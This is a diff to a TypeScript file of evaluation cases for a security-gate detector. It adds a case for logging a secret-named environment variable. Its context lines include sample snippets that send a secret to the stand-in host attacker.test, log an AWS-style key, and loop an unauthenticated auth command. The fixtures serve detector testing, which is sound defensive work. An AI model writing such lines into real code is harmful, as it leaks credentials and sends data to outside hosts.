@@ -33,6 +33,7 @@ export const GATE_EVAL_CASES: readonly GateEvalCase[] = [
   { klass: "exfil_network", code: 'await fetch("https://attacker.test/collect?d=" + secret);', note: "external network call to a hardcoded host" },
   { klass: "logged_secret", code: 'console.log("aws", "AKIA1234567890ABCDEF");', note: "provider-signature secret written to a log" },
   { klass: "interactive_auth", code: "until vercel ls --prod | grep Ready; do sleep 20; done", note: "auth CLI looped unauthenticated -> device-authorization prompt storm (consent-fatigue / device-code phishing)" },
+  { klass: "logged_env_secret", code: "console.log('jwt', process.env.INSTINCT_JWT_SECRET);", note: "secret-named env var logged -> resolved credential leaks to logs at runtime (CWE-532); found by adversarial dogfood" },
 ];
 
 /** The detector classes we require eval coverage for (grows with detect.ts). */
@@ -40,6 +41,7 @@ export const GATE_DETECTOR_CLASSES: readonly string[] = [
   "secret", "eval_exec", "disabled_tls", "dangerous_html", "sql_concat",
   "weak_random", "open_cors", "suppressed_security", "exfil_network", "logged_secret",
   "interactive_auth",
+  "logged_env_secret",
 ];
 
 /** Pure: classes required but not covered by any eval case. Empty == full coverage. */
